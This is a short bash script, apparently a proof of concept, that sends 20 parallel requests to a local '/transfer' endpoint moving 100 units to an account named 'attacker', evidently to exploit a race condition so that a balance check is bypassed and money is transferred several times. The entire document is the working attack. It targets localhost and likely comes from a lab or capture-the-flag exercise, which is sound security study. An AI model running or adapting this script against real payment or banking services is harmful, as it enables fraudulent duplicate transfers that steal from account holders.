#!/bin/bash
URL="http://localhost:9000/transfer?amount=100&to=attacker"
echo "[*] Sending 20 parallel requests to $URL"
for i in {1..20}; do
    curl -s "$URL" &
done
wait
echo ""
echo "[+] Done"
